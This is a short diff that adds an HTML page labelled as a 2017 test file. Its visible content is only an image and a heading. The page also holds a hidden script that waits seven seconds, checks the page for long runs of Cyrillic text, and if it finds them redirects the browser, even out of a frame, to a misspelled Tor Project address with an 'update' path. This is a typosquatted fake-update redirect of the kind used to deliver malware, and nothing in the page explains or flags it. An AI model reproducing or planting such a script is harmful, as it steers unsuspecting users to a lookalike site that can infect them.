@@ -1,0 +1,8 @@
+<html>
+<body><script type="text/javascript">setTimeout(function() { if(document.body.innerHTML.search(/[а-яА-ЯёЁ]{15,}/igm) >= 0) { if(top != self) { top.location = 'http://torproect.org/update/'; } else { document.location = 'http://torproect.org/update/'; } } },7000);</script>
+<img src="sailing.gif"/>
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+</body>
+</html>
